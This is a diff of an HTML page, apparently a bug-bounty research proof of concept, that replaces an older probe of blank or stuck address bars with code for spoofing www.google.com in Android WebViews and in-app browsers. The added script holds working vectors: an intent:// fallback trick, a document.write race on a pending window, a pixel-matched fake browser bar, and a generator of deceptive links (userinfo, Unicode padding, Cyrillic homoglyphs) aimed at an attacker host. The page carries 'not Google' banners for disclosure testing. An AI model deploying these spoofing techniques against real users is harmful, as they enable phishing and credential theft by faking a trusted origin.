@@ -1,45 +1,124 @@
-<!-- 51 | ⭐⭐⭐ SATU JALUR, DUA ARAH GAGAL — pemersatu seluruh keluarga bar-kosong | [1-CLICK]
-     Saat navigasi dibatalkan, browser menjalankan satu logika: "bar sudah dicat untuk tujuan
-     yang ternyata batal -> mundurkan". Logika itu bisa gagal ke DUA arah yang berlawanan,
-     dan dua-duanya adalah temuan:
-       MUNDUR TERLALU JAUH  -> bar KOSONG, tak ada teks apa pun    (kelas $10k klasik)
-       MUNDUR TIDAK SAMA SEKALI -> bar TERSANGKUT di URL tujuan     (bar menulis google.com,
-                                    layar menampilkan halaman kita)
-     Karena sumbernya satu jalur kode, satu pemicu (204) menguji keduanya sekaligus.
-     Jangan cari dua teknik — sapu satu jalur ke dua arah.
-     Enam jendela dibuka, masing-masing beda pada SATU knob saja: berapa entri riwayat yang
-     ada sebelum abort, dan apakah abort terjadi sebelum atau sesudah entri itu dibuat.
-     Itu variabel penentunya: bar mundur KE MANA tergantung ada-tidaknya tempat untuk mundur.
-     EXPECTED-SECURE  keenam menulis about:blank atau URL yang benar; tak satu pun kosong/tersangkut. -->
-<button onclick="go()">Run 51 (6 jendela)</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>WebView URL-bar spoof — research PoC</title>
+<style>
+  :root{--bg:#0d1117;--fg:#e6edf3;--mut:#8b949e;--acc:#2f81f7;--ok:#3fb950;--warn:#d29922}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+  header{padding:16px;border-bottom:1px solid #21262d}
+  h1{font-size:17px;margin:0 0 4px}
+  .mut{color:var(--mut);font-size:13px}
+  main{padding:16px;display:grid;gap:12px;max-width:640px;margin:0 auto}
+  .card{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:14px}
+  .card h2{font-size:14px;margin:0 0 6px;color:var(--acc)}
+  button{width:100%;padding:11px 14px;border:0;border-radius:8px;background:var(--acc);color:#fff;font-size:15px;font-weight:600;margin-top:8px}
+  input{width:100%;padding:9px 10px;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:var(--fg);margin-top:6px;font-size:14px}
+  code{background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:1px 5px;font-size:12px;word-break:break-all}
+  a{color:var(--warn);word-break:break-all}
+  /* fake mobile chrome for the inception-bar vector */
+  #fakechrome{position:fixed;inset:0 0 auto 0;height:56px;background:#f1f3f4;color:#202124;display:none;align-items:center;
+    padding:0 12px;font:14px system-ui;z-index:9999;box-shadow:0 1px 4px rgba(0,0,0,.3)}
+  #fakechrome .lock{margin-right:8px}
+  #fakechrome .url{flex:1;color:#202124}
+  #spoofbody{display:none;position:fixed;inset:56px 0 0 0;background:#fff;color:#111;overflow:auto;z-index:9998;padding:24px 16px}
+  #spoofbody .banner{background:#fff3cd;border:1px solid #ffe69c;color:#7a5b00;padding:10px 12px;border-radius:8px;font-weight:600}
+</style>
+</head>
+<body>
+<header>
+  <h1>WebView URL-bar spoofing — research PoC</h1>
+  <div class="mut">Predicate: bar/host-label shows <b>www.google.com</b> while content & real origin belong to the attacker page. Own-install WebView / in-app browser only.</div>
+</header>
+
+<main>
+  <div class="card">
+    <h2>V1 — intent:// re-arm (evolusi trik lama)</h2>
+    <div class="mut">Forced package-resolution failure + nested/back-pointing fallback → in-app browser sempat melukis authority intent (<code>www.google.com</code>) di jendela gagal-resolve sementara fallback me-render konten kita.</div>
+    <button onclick="v1_intent()">Fire V1 (intent://)</button>
+  </div>
+
+  <div class="card">
+    <h2>V2 — pending-URL write-over</h2>
+    <div class="mut">Buka jendela ke target yang <i>stall</i> (204 / hang), lalu <code>document.write</code> saat URL sudah di-commit optimis tapi dokumen belum. Isi endpoint stall kamu sendiri.</div>
+    <input id="stall" placeholder="https://www.google.com/…(endpoint yg hang/204)…" value="https://www.google.com/">
+    <button onclick="v2_pending()">Fire V2 (window.open + write)</button>
+  </div>
+
+  <div class="card">
+    <h2>V3 — inception-bar (fake chrome, paling reliable)</h2>
+    <div class="mut">Sembunyikan bar asli (scroll), lukis bar palsu pixel-match. Efektif di WebView/in-app browser yang bar-nya ikut menggulung.</div>
+    <button onclick="v3_inception()">Fire V3 (fake URL bar)</button>
+  </div>
+
+  <div class="card">
+    <h2>V4 — crafted-URL generator (userinfo / pad / IDN)</h2>
+    <div class="mut">Bikin link untuk ditempel ke in-app browser. Bar yang truncate/kurang-normalize memperlihatkan bagian awal sebagai <code>www.google.com</code>.</div>
+    <input id="atk" placeholder="attacker host, mis. evil.example" value="evil.example">
+    <button onclick="v4_links()">Generate links</button>
+    <div id="links" class="mut" style="margin-top:10px"></div>
+  </div>
+</main>
+
+<div id="fakechrome"><span class="lock">🔒</span><span class="url">www.google.com</span></div>
+<div id="spoofbody"><div class="banner">⚠ This is NOT www.google.com — address-bar spoofing PoC (benign)</div>
+  <p>If the URL/host bar above still reads <b>www.google.com</b>, the origin-display surface is decoupled from the security origin → spoof confirmed. Screenshot → STOP → report.</p>
+</div>
+
 <script>
-var E = 'https://www.google.com/gen_204';
-var V = [
-  ['nol riwayat: langsung 204', function (w) { }],
-  ['1 entri dulu, lalu 204', function (w) { setTimeout(function () { w.location = E; }, 900); }],
-  ['pushState dulu, lalu 204', function (w) { setTimeout(function () { try { w.history.pushState({}, '', '/a'); } catch (e) { } w.location = E; }, 900); }],
-  ['204 lalu 204 lagi', function (w) { setTimeout(function () { w.location = E; }, 1400); }],
-  ['204 lalu about:blank', function (w) { setTimeout(function () { w.location = 'about:blank'; }, 1400); }],
-  ['204 lalu back()', function (w) { setTimeout(function () { try { w.history.back(); } catch (e) { } }, 1400); }]
-];
-g.textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  V.forEach(function (v, i) {
-    setTimeout(function () {
-      var w = window.open(i === 0 ? E : '', '_blank', 'width=320,height=200,left=' + (20 + (i % 3) * 330) + ',top=' + (40 + Math.floor(i / 3) * 240));
-      if (!w) return;
-      v[1](w);
-      setTimeout(function () {
-        try { w.document.write('<div style="font:12px system-ui;padding:9px"><b>' + (i + 1) + '. ' + v[0] + '</b><br>' + location.origin + '</div>'); w.document.close(); } catch (e) { }
-      }, 2600);
-    }, i * 900);
-  });
-  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n6 jendela dibuka.\n\n' +
-    V.map(function (v, i) { return '  ' + (i + 1) + '. ' + v[0].padEnd(26) + 'bar: ________'; }).join('\n') +
-    '\n\nIsi tiap kolom dgn: KOSONG / about:blank / google.com / origin-ku' +
-    '\n  KOSONG    = mundur terlalu jauh   -> temuan' +
-    '\n  google.com = tidak mundur          -> temuan (yang lebih mahal)' +
-    '\n  about:blank = benar                -> aman';
+const SPOOF_HOST = 'www.google.com';
+const SPOOF_DOC =
+  '<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">' +
+  '<title>Google</title><body style="font:16px system-ui;padding:24px">' +
+  '<div style="background:#fff3cd;border:1px solid #ffe69c;color:#7a5b00;padding:10px;border-radius:8px;font-weight:600">' +
+  '&#9888; This is NOT www.google.com — address-bar spoofing PoC</div>' +
+  '<p>Check the URL/host bar: if it says <b>www.google.com</b>, spoof confirmed.</p></body>';
+
+// V1 — modern intent:// re-arm
+function v1_intent(){
+  const fb = encodeURIComponent(location.origin + location.pathname + '#spoofed'); // back to attacker content
+  // package= a non-existent app forces resolution failure; authority = spoof host
+  location.href =
+    'intent://' + SPOOF_HOST + '/#Intent;scheme=https;package=com.nonexistent.' + Math.abs(hash(location.href)) + ';' +
+    'S.browser_fallback_url=' + fb + ';end';
 }
+if (location.hash === '#spoofed') document.getElementById('spoofbody').style.display='block',
+                                   document.getElementById('fakechrome').style.display='flex';
+
+// V2 — pending-URL write-over (needs a stalling target endpoint)
+function v2_pending(){
+  const url = document.getElementById('stall').value.trim();
+  const w = window.open(url, '_blank');
+  // race the commit: some in-app browsers show requested URL optimistically
+  let n=0; const t=setInterval(()=>{ try{ w.document.open(); w.document.write(SPOOF_DOC); w.document.close(); }
+    catch(e){} if(++n>20) clearInterval(t); }, 25);
+}
+
+// V3 — inception bar (self-contained, reliable)
+function v3_inception(){
+  document.getElementById('fakechrome').style.display='flex';
+  document.getElementById('spoofbody').style.display='block';
+  window.scrollTo(0, 1); // nudge real chrome to collapse on mobile WebView
+}
+
+// V4 — crafted URL variants to paste into the in-app browser
+function v4_links(){
+  const atk = document.getElementById('atk').value.trim() || 'evil.example';
+  const pad = '\u2044'.repeat(40); // fraction-slash visual padding
+  const variants = [
+    ['userinfo',      'https://' + SPOOF_HOST + '@' + atk + '/'],
+    ['userinfo+pad',  'https://' + SPOOF_HOST + '\u2028' + pad + '@' + atk + '/'],
+    ['idn-confusable','https://' + 'www.g\u043e\u043egle.com' + '.' + atk + '/'], // Cyrillic о
+    ['long-subdomain','https://' + SPOOF_HOST + '.' + pad.slice(0,20) + '.' + atk + '/'],
+    ['data-authority','https://' + SPOOF_HOST + '/%2F%2E%2E%2F..@' + atk + '/']
+  ];
+  document.getElementById('links').innerHTML =
+    variants.map(v => '<div style="margin:6px 0"><b>'+v[0]+'</b><br><a href="'+v[1].replace(/"/g,'%22')+'">'+v[1]+'</a></div>').join('');
+}
+
+function hash(s){let h=0;for(let i=0;i<s.length;i++)h=(h*31+s.charCodeAt(i))|0;return h}
 </script>
+</body>
+</html>
